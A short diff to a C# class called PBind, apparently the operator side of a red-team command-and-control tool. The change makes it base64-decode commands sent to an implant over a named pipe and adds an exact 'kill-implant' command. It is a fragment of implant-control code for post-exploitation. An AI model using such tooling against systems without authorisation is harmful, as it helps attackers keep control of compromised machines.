@@ -58,8 +58,15 @@ public class PBind
         }
         else if (pbindConnected)
         {
-            var command = $"{string.Join(" ", args)}";
-            if (command.ToLower().StartsWith("kill"))
+            string command = null;
+            if (args[0].StartsWith("loadmodule") || args[0].StartsWith("kill-implant"))
+            {
+                command = args[0];
+            } else {
+                byte[] data = Convert.FromBase64String(args[0]);
+                command = Encoding.UTF8.GetString(data);
+            }
+            if (command.ToLower().Trim() == "kill-implant")
             {
                 pbindConnected = false;
                 IssueCommand(command);
@@ -172,7 +179,7 @@ public class PBind
                     Console.Write("[-] Error, received unexpected response from target: " + input);
                 }
 
-                if (command.ToLower().StartsWith("kill"))
+                if (command.ToLower().Trim() == "kill-implant")
                 {
                     var encrypted_output = Encrypt(encryptionKey, "KILL");
                     pipeWriter.WriteLine(encrypted_output);
